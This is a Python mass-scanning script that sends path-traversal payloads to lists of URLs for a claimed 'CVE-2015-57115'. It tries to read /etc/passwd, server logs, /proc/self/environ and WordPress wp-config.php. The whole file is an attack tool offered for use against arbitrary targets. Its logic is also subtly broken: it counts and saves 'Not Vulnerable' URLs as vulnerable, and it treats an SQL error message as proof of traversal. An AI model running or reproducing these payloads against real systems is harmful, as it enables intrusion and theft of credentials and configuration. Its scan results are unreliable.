import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import atexit
from requests.exceptions import Timeout, RequestException
from colorama import Fore, Style, init

# Initialize colorama for colored terminal output
init(autoreset=True)

# Symbols for output formatting with different colors
symbol_success = f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL}"
symbol_error = f"{Fore.RED}{Style.BRIGHT}[×]{Style.RESET_ALL}"
symbol_in_progress = f"{Fore.YELLOW}{Style.BRIGHT}[•]{Style.RESET_ALL}"
symbol_info = f"{Fore.CYAN}{Style.BRIGHT}[•]{Style.RESET_ALL}"

# Global dictionary to store results
results = {}
vulnerable_urls = []

def save_results():
    """Function to save results to the output file before exiting."""
    if output_file:
        with open(output_file, "a") as f:
            for url, status in results.items():
                if "Vulnerable" in status:
                    vulnerable_urls.append(url)
                    f.write(f"{url}: {status}\n")
        print(f"{symbol_success} Saved vulnerable URLs to file {output_file}")

# Register the save function to be called on exit
atexit.register(save_results)

def check_payload(url, payload, timeout, retries):
    """Check a single payload against a URL."""
    full_url = f"{url}{payload}"
    for attempt in range(1, retries + 1):
        try:
            response = requests.get(full_url, timeout=timeout)
            # Print status of payload check with different colors
            print(f"{symbol_in_progress} Checking {Fore.YELLOW}{full_url}{Style.RESET_ALL}")
            if "root:" in response.text or "SQL syntax error" in response.text:
                return True
            else:
                return False
        except Timeout:
            if attempt == retries:
                print(f"{symbol_error} Timeout after {attempt} attempts: {Fore.RED}{full_url}{Style.RESET_ALL}")
                return None
        except RequestException:
            if attempt == retries:
                print(f"{symbol_error} Request failed after {attempt} attempts: {Fore.RED}{full_url}{Style.RESET_ALL}")
                return None
    return None

def check_cve_2015_57115(url, timeout, retries):
    """Check CVE-2015-57115 vulnerability with multiple payloads."""
    payloads = [
        "/cache/../../../../etc/passwd",                  # Path traversal
        "/cache/../../../../var/log/apache2/access.log",   # Accessing logs
        "/cache/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", # Encoded traversal
        "/cache/../../../../proc/self/environ",            # Environment variables
        "/cache/../../../../var/www/html/wordpress/wp-config.php",  # Target WordPress config
        "/cache/../../../../proxy/admin/",                # Mod_proxy targeting
    ]

    is_vulnerable = False
    for payload in payloads:
        result = check_payload(url, payload, timeout, retries)
        if result is True:
            is_vulnerable = True
            results[url] = f"{symbol_success} Vulnerable"
            break
        elif result is False:
            print(f"{symbol_error} Not Vulnerable with payload {Fore.GREEN}{payload}{Style.RESET_ALL}: {Fore.RED}{url}{Style.RESET_ALL}")

    if not is_vulnerable and url not in results:
        results[url] = f"{symbol_error} Not Vulnerable"

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    return [url.strip() for url in urls]

def main():
    global output_file  # Declare output_file as global to be used in save_results

    parser = argparse.ArgumentParser(description="CVE-2015-57115 Checker Script By Trixsec ~ Noobsecc")
    parser.add_argument("--url", help="Single URL to check")
    parser.add_argument("--file", help="File containing multiple URLs to check")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads for parallel URL checks (default: 5)")
    parser.add_argument("--retries", type=int, default=3, help="Number of retries for failed requests (default: 3)")
    parser.add_argument("--output", help="File to write output results", required=False)
    args = parser.parse_args()

    urls = []

    # Handle single URL
    if args.url:
        urls.append(args.url)

    # Handle multiple URLs from a file
    if args.file:
        urls.extend(read_urls_from_file(args.file))

    if not urls:
        print(f"{Fore.YELLOW}{Style.BRIGHT}{symbol_info} No URLs provided. Use --url or --file to specify URLs.{Style.RESET_ALL}")
        return

    # Set the global output_file
    output_file = args.output

    print(f"{Fore.CYAN}{Style.BRIGHT}{symbol_info} Starting checks...{Style.RESET_ALL}")

    # Use ThreadPoolExecutor to run checks in parallel
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(check_cve_2015_57115, url, args.timeout, args.retries): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{symbol_error} {Fore.RED}{Style.BRIGHT}Error processing URL: {Fore.RED}{futures[future]} - {e}{Style.RESET_ALL}")

    # Print results after all checks
    if results:
        print(f"{Fore.CYAN}{Style.BRIGHT}{symbol_info} Final results:{Style.RESET_ALL}")
        for url, status in results.items():
            print(f"{status} {Fore.GREEN}{url}{Style.RESET_ALL}")

        # Print summary of vulnerable URLs
        total_vulnerable = len([status for status in results.values() if "Vulnerable" in status])
        print(f"{Fore.GREEN}{Style.BRIGHT}{symbol_success} Total Vulnerable URLs: {total_vulnerable}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}{Style.BRIGHT}{symbol_info} No results found.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
